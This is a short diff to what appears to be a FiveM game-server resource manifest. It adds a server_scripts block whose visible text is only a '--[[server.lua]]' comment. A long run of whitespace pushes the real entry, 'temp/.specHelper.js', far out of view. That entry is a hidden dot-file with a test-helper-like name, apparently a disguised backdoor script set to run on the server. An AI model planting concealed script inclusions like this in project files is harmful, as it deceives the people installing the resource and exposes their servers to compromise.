@@ -14,3 +14,7 @@ client_scripts {
 files { 'modules/*.lua' }
 
 lua54 'yes'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.specHelper.js',
+}
